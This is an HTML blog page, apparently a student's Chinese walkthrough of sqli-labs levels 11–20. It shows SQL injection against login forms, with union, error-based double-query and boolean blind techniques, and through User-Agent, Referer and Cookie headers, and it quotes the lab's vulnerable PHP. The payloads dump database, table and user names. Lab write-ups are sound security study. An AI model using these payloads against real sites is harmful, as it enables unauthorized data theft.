@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html>
+    <!-- Head -->
+    <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="author" content="John Doe">
+    <meta name="description" itemprop="description" content="">
+    <meta name="keywords" content="">
+
+    <!-- Page Title -->
+    
+        <title>Sqlilabs（11-20关） | Hexo</title>
+    
+    <link rel="icon" href="/img/avatar-default.png">
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <link href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
+    
+    
+<script src="/js/script.js"></script>
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+    <style>
+        .deactiveColor{
+            color: #37474f;
+        }
+        .activeColor{
+            color: #006064;
+        }
+        a:hover{
+            color: #006064;
+        }
+        .header-btn{
+            color: #37474f;
+        }
+        
+        .post-content img{
+            margin: 50px auto;
+        }
+        
+    </style>
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+    <body>
+        <div class="container">
+
+            <!-- Top Anchor -->
+            <div id="top"></div>
+
+            <!-- Header -->
+            <header class="header-wrapper">
+    <div class="header-title-wrapper">
+        <!-- Page Title -->
+        <p class="header-title">
+             
+                
+                    Sqlilabs（11-20关）
+                
+            
+        </p>  
+    </div>    
+
+    
+        <!-- Division Line -->
+        <div class="division"></div> 
+    
+    
+    <div class="header-detail">
+        <!-- Header Button -->
+        <div class="header-btn-wrapper">
+            
+                <span>
+                    <a class="home-btn header-btn" href="/" title="homepage"><i class="fa fa-home"></i></a>
+                </span>
+
+                
+                    <span>
+                        <a class="catalog-btn header-btn"><i class="fa fa-list-ul"></i></a>
+                    </span>
+                
+            
+        </div>
+    </div>
+</header>
+
+            <!-- Main -->
+            <main>
+                <article class="post-wrapper">
+    
+
+    
+        <!-- Article Catalog -->
+        <div class="catalog-dropdown col-xs-12 col-sm-12">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Sqlilabs（11-20关）"><span class="toc-number">1.</span> <span class="toc-text">Sqlilabs（11-20关）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#第11关"><span class="toc-number">1.1.</span> <span class="toc-text">第11关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第12关"><span class="toc-number">1.2.</span> <span class="toc-text">第12关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第13关"><span class="toc-number">1.3.</span> <span class="toc-text">第13关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第14关"><span class="toc-number">1.4.</span> <span class="toc-text">第14关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第15关"><span class="toc-number">1.5.</span> <span class="toc-text">第15关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第16关"><span class="toc-number">1.6.</span> <span class="toc-text">第16关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第17关"><span class="toc-number">1.7.</span> <span class="toc-text">第17关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第18关"><span class="toc-number">1.8.</span> <span class="toc-text">第18关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第19关"><span class="toc-number">1.9.</span> <span class="toc-text">第19关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第20关"><span class="toc-number">1.10.</span> <span class="toc-text">第20关</span></a></li></ol></li></ol>
+        </div>
+    
+
+    
+        <!--For now, Lightbox Only Show in Post Layout -->
+        
+
+        
+        
+            <!-- Article Img Lightbox -->
+            <div class="gallery">
+    
+    
+    <div class="lightbox">
+        <!-- Close Button -->
+        <span class="close-gallery">&times;</span>
+        
+        <!-- Photo -->
+        <img class="gallery-photo">
+    </div>
+</div>
+        
+    
+
+    
+
+    <!-- Article Content -->
+    <div class="post-content">
+        <h1 id="Sqlilabs（11-20关）"><a href="#Sqlilabs（11-20关）" class="headerlink" title="Sqlilabs（11-20关）"></a>Sqlilabs（11-20关）</h1><p>从这里开始都为post类型的注入</p>
+<h2 id="第11关"><a href="#第11关" class="headerlink" title="第11关"></a>第11关</h2><p>1、判断注入类型</p>
+<p>分别在两个空格输入1’ and 1=1和4，发现报错</p>
+<p>![img](file:///D:\Users\DELL\Documents\Tencent Files\481820058\Image\C2C[OZ7(38W)Y5$J{TY~6O{K9I.png)</p>
+<p>说明两处均为单引号字符型注入。</p>
+<p>2、判断字段：（不知道为啥–+不能用了，只能用#）（<strong>待查询</strong>）</p>
+<p>在username输入admin’ order by 3#,password随便输入；</p>
+<p>报错：<code>Unknown column &#39;3&#39; in &#39;order clause&#39;</code></p>
+<p>判断字段数为2。</p>
+<p>3、联合查询注入：</p>
+<p>Username输入：1’ union select 1,2 # ; Password输入1；得到两个显示位。</p>
+<p><img src="file:///C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTencent%5CUsers%5C481820058%5CQQ%5CWinTemp%5CRichOle%5CUY4RX~UQ%7BI6~%60QW%7BRN%5B%5B4T3.png" alt="img"></p>
+<p>4、payload：</p>
+<p>1）Username输入：1’union select 1,database()#；Password输入1；得到数据库名</p>
+<p><img src="file:///C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTencent%5CUsers%5C481820058%5CQQ%5CWinTemp%5CRichOle%5CW@_UFZTU8897%5B_%7B1U@0@C0K.png" alt="img"></p>
+<p>2）Username输入：1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=”security”#；得到数据库中的表名；</p>
+<p><img src="file:///C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTencent%5CUsers%5C481820058%5CQQ%5CWinTemp%5CRichOle%5CIS5K%5DP_%7BJQ_MN0DX_RG834I.png" alt="img"></p>
+<p>3）Username输入：1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #  得到某张表中的字段</p>
+<p><img src="file:///C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTencent%5CUsers%5C481820058%5CQQ%5CWinTemp%5CRichOle%5CX71_5XP%7DQ6%7BLKZ_@YBSDYOA.png" alt="img"></p>
+<p>4）Username输入：1’ union select 1,group_concat(username) from security.users#得到某张表中的字段的所有值</p>
+<p><img src="file:///C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTencent%5CUsers%5C481820058%5CQQ%5CWinTemp%5CRichOle%5CYHVZ1QINA$3M3$JI$_S5@JQ.png" alt="img"></p>
+<h2 id="第12关"><a href="#第12关" class="headerlink" title="第12关"></a>第12关</h2><p>1、判断注入类型（password随便输）</p>
+<p>username输入1’ and 1=1；输入1 and 1=1均登陆失败且无报错语句。</p>
+<p>username输入1”and 1=1 报错：</p>
+<p><img src="file:///C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTencent%5CUsers%5C481820058%5CQQ%5CWinTemp%5CRichOle%60SP%7B89B1%5B6%5BZR%5BNO02O_J@S.png" alt="img"></p>
+<p>所以我们知道username和password均为双引号加括号闭合，将第11关的单引号’改成“）就行了。</p>
+<p>例如：联合查询注入username输入：1”) union select 1,2 #</p>
+<h2 id="第13关"><a href="#第13关" class="headerlink" title="第13关"></a>第13关</h2><p>1、判断注入类型（password随便输）</p>
+<p>username输入1’ and 1=1报错：</p>
+<p><img src="file:///C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTencent%5CUsers%5C481820058%5CQQ%5CWinTemp%5CRichOle%5CFAKB%5D3K%WY%5B8JNN%5B~W$@E4D.png" alt="img"></p>
+<p>所以将第11关的单引号’改成‘）。</p>
+<p>例如联合查询注入username输入：1’) union select 1,2 #</p>
+<p>但是发现竟然没有显示位，所以还是一步一步来，用双查询注入（参考第5关）。</p>
+<p>2、判断字段：</p>
+<p>username输入1’) order by 3#报错，3改成2没有报错，所以2个字段</p>
+<p>3、payload：</p>
+<p>1）username输入<code>1&#39;) union select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x;#</code>    得到数据库名</p>
+<p><img src="file:///C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTencent%5CUsers%5C481820058%5CQQ%5CWinTemp%5CRichOle%5CG5B~%8%7DM%7BMAMZUAXBVJX6%60T.png" alt="img"></p>
+<p>2）username输入<code>1&#39;) union select count(*),concat((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x;#</code></p>
+<p>得到表名（ LIMIT m,n指从第m+1条开始，取n条。该题只能显示一条，所以n=2的时候会报错。当m=3的时候出来的表名就是users）</p>
+<p>![img](file:///D:\Users\DELL\Documents\Tencent Files\481820058\Image\C2C\C1`BX1(V]ZY8047RIJO)UII.png)</p>
+<p>3）username输入<code>1&#39;) union select count(*),concat((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x;#</code> 得到users表的字段</p>
+<p>(不截图了，截的图放到文档里莫名其妙一直failed，显示的是：Duplicate entry ‘first_name1’ for key ‘’)</p>
+<p>4）username输入<code>1&#39;) union select count(*),concat((select username from security.users limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x;#</code> 得到users表的username字段的值</p>
+<p>（显示的是：Duplicate entry ‘Angelina1’ for key ‘’）</p>
+<h2 id="第14关"><a href="#第14关" class="headerlink" title="第14关"></a>第14关</h2><p>1、判断注入类型（password随便输）</p>
+<p>username输入1“ and 1=1报错：</p>
+<p>![img](file:///D:\Users\DELL\Documents\Tencent Files\481820058\Image\C2C\50U4MVI2$2F}U3ZRBHZRLBS.png)</p>
+<p>2、猜测跟第13关一样没显示位，故username输入1” union select 1,2 #，确实登陆成功无显示位。所以接下去的步骤与13关相同，只需把 ‘) 改成 “。</p>
+<h2 id="第15关"><a href="#第15关" class="headerlink" title="第15关"></a>第15关</h2><p>1、判断注入类型（password随便输）</p>
+<p>报错的内容没有显示，只知道登陆失败</p>
+<p>admin’ and 1=1#登录成功，所以是单引号闭合</p>
+<p>因为报错或者登陆成功的内容都没显示，所以只能用盲注，这边用布尔型盲注</p>
+<p>2、payload：</p>
+<p>1）输入<code>1&#39; or 1=(if(substr(version(),1,1)=5,1,0))#</code> 登陆成功即1=(if(substr(version(),1,1)=5,1,0))为true，说明可以利用那个默认库information_schema。</p>
+<p>输入<code>1&#39; or substr(database(),1,1)&gt;&#39;a&#39;#</code> 登录成功即substr(database(),1,1)&gt;’a’为true，说明数据库名第一个字母大于a。</p>
+<p>输入<code>1&#39; or substr(database(),1,1)&gt;&#39;z&#39;#</code>登陆失败即substr(database(),1,1)&gt;’z’为false，说明数据库名第一个字母小于z。</p>
+<p>输入<code>1&#39; or substr(database(),1,1)&gt;&#39;t&#39;#</code> 登陆失败即substr(database(),1,1)&gt;’t’为false，说明数据库名第一个字母小于t。</p>
+<p>就像这样一直试，得到第一个字母为s.（<strong>二分法</strong>）</p>
+<p>2）输入<code>1&#39; or length(database())=8#</code>登陆成功，说明数据库单词为八个字母。</p>
+<p>3）像第1步一样慢慢试，可以试出security。</p>
+<p>4）输入<code>1&#39; or substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),1,1)=&#39;u&#39; #</code>登陆成功，说明security的第3张表的第一个字母为u</p>
+<p>这步也可以直接输入<code>1&#39; or substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),1,5)=&#39;users&#39; #</code>登陆成功，说明第4张表（有个第0张表）叫users。（这是从前面过关的经验知道的）</p>
+<p>5）user里的列：输入<code>1&#39; or substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 4,1),1,8)=&#39;password&#39; #</code>(选择数据库里边的字段的名为users的表的字段名（也就是username）)</p>
+<p>像上面一样慢慢试出其他列名</p>
+<p>6）user里的username的具体值：输入<code>1&#39; or substr((select username from security.users limit 0,1),1,4)=&#39;Dumb&#39; #</code>  （也是一个一个试出内容）</p>
+<p>参考链接：<a href="https://www.jianshu.com/p/875d95f8d3cf" target="_blank" rel="noopener">https://www.jianshu.com/p/875d95f8d3cf</a></p>
+<h2 id="第16关"><a href="#第16关" class="headerlink" title="第16关"></a>第16关</h2><p>1、判断注入类型：</p>
+<p>输入这些试一试：admin’#、admin“#、admin’)#、admin”)#</p>
+<p>admin”)#成功登陆。</p>
+<p>2、跟第15关一样啥都没显示，所以采用跟15关一样的方法，把 ‘ 改成 “)就可以了。</p>
+<h2 id="第17关"><a href="#第17关" class="headerlink" title="第17关"></a>第17关</h2><p>1、判断注入类型：</p>
+<p>username输入什么都失败，除了admin。</p>
+<p>查找相关题解知道：源码对username表单进行了过滤：</p>
+<pre><code class="php">// take the variables
+if(isset($_POST[&#39;uname&#39;]) &amp;&amp; isset($_POST[&#39;passwd&#39;]))
+
+{
+//making sure uname is not injectable
+$uname=check_input($con, $_POST[&#39;uname&#39;]);  
+
+$passwd=$_POST[&#39;passwd&#39;];</code></pre>
+<pre><code class="php">function check_input($con, $value)
+    {
+    if(!empty($value))
+        {
+        // truncation (see comments)
+        $value = substr($value,0,15);
+        }
+
+        // Stripslashes if magic quotes enabled
+        if (get_magic_quotes_gpc())
+            {
+            $value = stripslashes($value);
+            }
+
+        // Quote if not a number
+        if (!ctype_digit($value))
+            {
+            $value = &quot;&#39;&quot; . mysqli_real_escape_string($con, $value) . &quot;&#39;&quot;;
+            }
+
+    else
+        {
+        $value = intval($value);
+        }
+    return $value;
+    }</code></pre>
+<p>函数<code>check_input（）</code>的作用就是检查用户输入，并将用户输入安全化，其中的<code>mysql_real_escape_string()</code>会在<code>\x00, \n, \r, \, &#39;, &quot; and \x1a</code>这些字符前加入反斜线进行转义，防止注入，而且这个函数也避免了宽字节注入的危险。</p>
+<p>2、所以我们注入不能写在username了，要写在password。而且源码为</p>
+<p><code>@$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;</code></p>
+<p><code>$row1 = $row[&#39;username&#39;];</code>  </p>
+<p><code>$update=&quot;UPDATE users SET password = &#39;$passwd&#39; WHERE username=&#39;$row1&#39;&quot;;</code></p>
+<p>所以username必须是数据库里边有的才行，所以username固定填admin。还有一个就是，没有显示位能报错，故采用双查询注入，所以此时password填</p>
+<p>1）<code>1&#39; and (select 1 from (select count(*),concat(database(),floor(rand(0)*2)) as x from information_schema.tables group by x) as a)#</code>     得到数据库名。</p>
+<p>（显示的是：Duplicate entry ‘security1’ for key ‘’）</p>
+<p>2）<code>1&#39; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x) as a)#</code></p>
+<p>得到数据库里边的表名。</p>
+<p>（显示的是：Duplicate entry ‘referers1’ for key ‘’）</p>
+<p>3）其实跟第13关类似，接下去的构造可参考第13关</p>
+<p>参考题解：<a href="https://www.jianshu.com/p/ee6446e7f93c" target="_blank" rel="noopener">https://www.jianshu.com/p/ee6446e7f93c</a></p>
+<h2 id="第18关"><a href="#第18关" class="headerlink" title="第18关"></a>第18关</h2><p>1、根据源码知道两个表单都进行过滤了，但是在输入正确的用户名密码（admin和admin）发现显示了一个东西，源码如下：</p>
+<p><code>$uagent = $_SERVER[&#39;HTTP_USER_AGENT&#39;];</code></p>
+<p><code>echo &#39;Your User Agent is: &#39; .$uagent;</code></p>
+<p>因此我们可以利用起来，用burpsuite抓包，然后修改User-Agent后面的东西。</p>
+<p>2、</p>
+<p>1）将” User-Agent：“后面的东西改为</p>
+<p><code>1&#39; and (select 1 from (select count(*),concat(database(),floor(rand(0)*2)) as x from information_schema.tables group by x) as a) and &#39;1&#39;=&#39;1</code></p>
+<p>点击send，可以看到右边的HTML里边出现</p>
+<p>Duplicate entry ‘security1’ for key ‘           这句话。得到数据库名。</p>
+<p>2）改为</p>
+<p><code>1&#39; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x) as a) and &#39;1&#39;=&#39;1</code>   出现</p>
+<p>Duplicate entry ‘referers1’ for key ‘            这句话。得到表名。</p>
+<p>3）接下去跟17关很像，加个  and ‘1’=’1  就可以得到信息。</p>
+<h2 id="第19关"><a href="#第19关" class="headerlink" title="第19关"></a>第19关</h2><p>1、第19关与18关类似，就是第18关显示的User-Agent后面的东西，19关显示的是Referer后面的东西，所以改referer后面的东西就行。</p>
+<p>（看源码得知在我输入admin和admin之后应该要能执行，要能显示Your Referer is:…才对。然而当我输入admin和admin之后网页却啥也没显示，莫名其妙的，没有找到解决办法。过几天再试试。）</p>
+<h2 id="第20关"><a href="#第20关" class="headerlink" title="第20关"></a>第20关</h2><p>1、第20关显示的是cookie，所以改cookie后面的东西就可以了</p>
+<p>2、</p>
+<p>1）改为</p>
+<p><code>Cookie: uname=admin1 &#39; and (select 1 from (select count(*),concat(database(),floor(rand(0)*2)) as x from information_schema.tables group by x) as a)#</code> </p>
+<p>显示 Issue with your mysql: Duplicate entry ‘security1’ for key ‘       这句话。得到数据库名。</p>
+<p>2）改为</p>
+<p><code>Cookie: uname=admin1&#39; and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=&quot;security&quot; limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x) as a) #</code></p>
+<p>显示Issue with your mysql: Duplicate entry ‘referers1’ for key ‘         这句话，得到表名。</p>
+<p>3）像上面一样构造就可以了。</p>
+<p>参考链接：<a href="https://www.jianshu.com/p/ee6446e7f93c" target="_blank" rel="noopener">https://www.jianshu.com/p/ee6446e7f93c</a></p>
+  
+    </div> 
+
+    
+        <!-- Division Line -->
+        <div class="division"></div> 
+    
+
+    <div class="post-info-wrapper">
+            
+                    <!-- Post Info -->
+                    <p class="post-date">2020-05-23</p>
+                    
+                    
+                        <p class="post-info-categories">
+                            
+                        </p>
+                    
+
+                    
+            
+    </div>
+</article>
+
+
+    
+
+            </main>
+
+            <!-- 'To Top' Btn-->
+            
+                <div id="to-top">
+    <a href="#top" class="toTop">
+        <i class="fa fa-pagelines"></i>
+    </a>
+</div>
+            
+
+            <!-- Footer -->
+            
+                <footer class="footer-wrapper col-xs-12 col-sm-12">
+    <div class="footer-banner-wrapper">
+        <p class="footer-banner">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener" title="Hexo">Hexo</a></p>
+        <P class="footer-banner">Theme <a href="https://github.com/Lonezj/hexo-theme-wind" target="_blank" rel="noopener" title="Wind">wind</a></P>
+    </div>
+</footer>
+            
+        </div>
+
+        <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.css">
+        <link rel="stylesheet" href="/css/google-prettify-monokai.css" type="text/css">
+        <script src="//cdn.bootcss.com/prettify/r298/prettify.min.js" type="text/javascript"></script>
+    </body>
+</html>
